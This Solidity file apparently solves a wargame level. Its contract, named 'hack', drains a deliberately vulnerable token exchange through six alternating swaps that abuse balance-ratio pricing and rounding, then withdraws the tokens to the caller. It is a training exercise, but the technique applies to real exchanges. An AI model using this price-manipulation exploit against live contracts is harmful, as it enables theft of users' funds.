// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface Dex  {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function setTokens(address _token1, address _token2) external ;
  function addLiquidity(address token_address, uint amount) external ;
  function swap(address from, address to, uint amount) external ;
  function getSwapPrice(address from, address to, uint amount) external  view returns(uint) ;
  function approve(address spender, uint amount) external ;
  function balanceOf(address token, address account) external  view returns (uint);
}

interface SwappableToken  {
  function approve(address owner, address spender, uint256 amount) external;
}

contract hack {
  
  Dex public  dex ;
  IERC20 public token1;
  IERC20 public token2;

  constructor(address _address) {
    dex = Dex(_address);
    token1 = IERC20(dex.token1());
    token2 = IERC20(dex.token2());
  }

  function attack() public  { 
    // first this contract has 10 tokens each
    dex.approve(address(dex), 10000);
    dex.swap(address(token1) , address(token2) , 10);
    dex.swap(address(token2) , address(token1) , 20);
    dex.swap(address(token1) , address(token2) , 24);
    dex.swap(address(token2) , address(token1) , 30);
    dex.swap(address(token1) , address(token2) , 41);
    dex.swap(address(token2) , address(token1) , 45);    
  }

  function withdraw() public {
    token1.transfer(msg.sender , token1.balanceOf(address(this)));
    token2.transfer(msg.sender , token2.balanceOf(address(this)));
  }

}